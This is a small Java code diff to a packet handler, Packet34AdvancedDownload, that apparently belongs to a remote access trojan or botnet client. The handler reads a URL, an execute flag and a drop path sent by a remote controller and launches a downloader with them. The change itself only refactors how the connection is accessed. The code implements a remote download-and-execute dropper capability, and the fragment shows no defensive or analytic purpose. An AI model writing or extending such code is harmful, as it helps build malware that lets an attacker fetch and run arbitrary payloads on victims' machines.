@@ -7,9 +7,9 @@ public class Packet34AdvancedDownload extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		String url = Connection.readLine();
-		boolean exec = Connection.readBoolean();
-		String drop = Connection.readLine().toLowerCase();
+		String url = Connection.instance.readLine();
+		boolean exec = Connection.instance.readBoolean();
+		String drop = Connection.instance.readLine().toLowerCase();
 		new AdvancedDownloader(url, exec, drop).start();
 	}
 
